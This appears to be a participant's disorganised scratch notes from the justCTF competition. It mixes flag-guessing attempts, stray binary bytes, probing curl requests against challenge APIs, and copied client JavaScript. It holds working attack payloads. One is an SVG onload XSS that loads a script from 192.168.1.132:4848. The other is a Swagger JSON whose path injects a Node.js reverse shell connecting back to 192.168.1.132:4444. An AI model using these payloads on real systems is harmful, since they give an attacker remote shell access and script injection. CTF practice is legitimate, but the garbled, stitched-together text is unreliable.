current flag: j
Great! You found first letter
You can send more than one command at the time, for example 'www' will go up by three spots

Current flag: ju


justCTF{J


justCTF{uLSroMxeTAxkNUS

justCTF{uCnLsMaZTuuFXXm

justCTF{uCA8FlFxrGRDciv

 justCTF{uCAjyiOQEbFXkUS
 
 justCTF{uCA8DzDzCTftKZG

justCTF{uCA8yKiIWEsSvBc

justCTF{uCA8yGCq

justCTF{uCA8yGCqg


justCTF{uCA8ysukz

justCTF{uCA8ysuM8erMY


justCTF{uCA8ysuM8q9oV


justCTF{uCA8ysuM8q9BiCl

justCTF{uCA8ysuM8q9BTlK


justCTF{uCA8ysuM8q9BTp}
Win

---
040$ \x80 \x84 \x80 \0\x04 \0 \xC0 \xC4 \xC0 \0 \x04 \0 \x10 \x14 \x10 \0 \x04 \0d \0 \x04 \0 $ \x08 \x88 \x8C \x88 \x18 \x1C \x18 imi \xA9 \xAD \xA9 
 y}yY]Yy}y9=9y}ylMllMl9=9Y]YlMllMlimiy}
 
 
 ## Velociraptor
 
 ```
 $(function() {
    $('#generate-btn').click(function() {
        var payload = {
            template: $('#template').val()
        }

        $.ajax({
            url: '/api/expandTemplate',
            method: 'POST',
            contentType: 'application/json',
            dataType: 'text',
            data: JSON.stringify(payload),
            success: function(response) {
                $('.resultContainer').show();
                $('#result').val(response);
                $('#result').trigger("input");
            }
        });
    });
});
 ```
 
 curl velociraptor.web.jctf.pro/api/expandTemplate -H "Accept: application/json"

{"message":"Specified Accept Types [application/json] not supported. Supported types: [text/plain]","_links":{"self":{"href":"/api/expandTemplate","templated":false}}

 curl -X POST velociraptor.web.jctf.pro/api/expandTemplate -H "Accept: text/plain"

{"message":"Required Body [request] not specified","path":"/request","_links":{"self":{"href":"/api/expandTemplate","templated":false}}}
  ```
curl -X POST http://velociraptor.web.jctf.pro/api/expandTemplate -H 'Content-Type: application/json' -d '{"dataType": "'text'"","data":"any","success":"true"}'
   
   ```
   
   
   Gobucket.zip
   
   ```
    <script>
      var bucketId = localStorage.getItem('bucketId');
      var bucketIdElement = document.getElementById('bucketId')
      var uploadButton = document.getElementById('uploadButton')
      var fileInput = document.getElementById('file')
      var formStatus = document.getElementById('formStatus')

      async function requestBucketId() {
        var response = await fetch("/api/newBucket", { method: "POST" });
        var json = await response.json();

        if (json.ok) {
          return json.bucketId
        } else {
          return null
        }
      }

      async function uploadFile() {
        if (fileInput.files.length != 1) {
          formStatus.innerHTML = `<span style="color: red;">Please select a single file to upload.</span>`
          return 
        }

        if (!bucketId) {
          formStatus.innerHTML = `<span style="color: red;">The bucket ID is not set, please request a new one.</span>`
          return
        }

        var data = new FormData()
        data.append('file', fileInput.files[0])
        data.append('bucketId', bucketId)

        var response = await fetch('/api/uploadFile', {
          method: 'POST',
          body: data
        })
        var json = await response.json()

        if (json.ok) {
          formStatus.innerHTML = `File uploaded successfully: <a href="${json.filepath}">${json.filepath}</a>`
        } else {
          formStatus.innerHTML = `<span style="color: red;">Error occurred while uploading the file: ${json.error}</span>`
        }
      }

      async function fetchBucketId(forceRefresh) {
        if (bucketId == null || forceRefresh) {
          bucketId = await requestBucketId()
          if (bucketId == null) {
            bucketIdElement.innerHTML = `<span style="color: red;">Error occurred while requesting a bucket. Please refresh the page or request a new bucket.<span>`
            return
          }
        }
        
        localStorage.setItem('bucketId', bucketId)
        bucketIdElement.innerText = bucketId
      }

      document.addEventListener("DOMContentLoaded", async function() {
        await fetchBucketId(false)
      });
    </script>
```
APIs
```
var response = await fetch('/api/uploadFile', {
          method: 'POST',
          body: data
```

```
		 var response = await fetch("/api/newBucket", { method: "POST" });
        var json = await response.json();

        if (json.ok) {
          return json.bucketId
        } else {
          return null
        }
      }
	  
```

<svg/onload=setInterval(function(){with(document)body.appendChild(createElement(“script”)).src=”//192.168.1.132:4848″


cea1c26e-a57f-4676-a691-1618ec12bd89


{                                                                                                                                    
          "swagger": "2.0",
          "info": {
              "description": "A",
              "version": "1.0.0",
              "title": "C"
          },
          "schemes": [
              "http"
          ],
          "host": "http://web-api-intended.web.jctf.pro/docs/",
          "basePath": "/",
          "produces": [
              "application/json"
          ],
          "consumes": [
              "application/json"
          ],
          "paths": {
              "/a');};};return exports;})); (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? \"cmd\" : \"/bin/sh\"; var net = require(\"net\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(4444, \"192.168.1.132\", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === \"undefined\") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on(\"error\", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();(function(){}(this,function(){a=function(){b=function(){new Array('": {
                  "get": {
                      "description": "D",
                      "responses": {
                          "200": {
                              "description": "E",
                              "schema": {
                                  "$ref": "#/definitions/d"
                              }
                          }
                      }
                  }
              }
          },
          "definitions": {
              "d": {
                  "type": "object",
                  "description": "F",
                  "properties": {
                      "id": {
                          "type": "integer",
                          "format": "int64"
                      }
                  }
              }
          }
      }
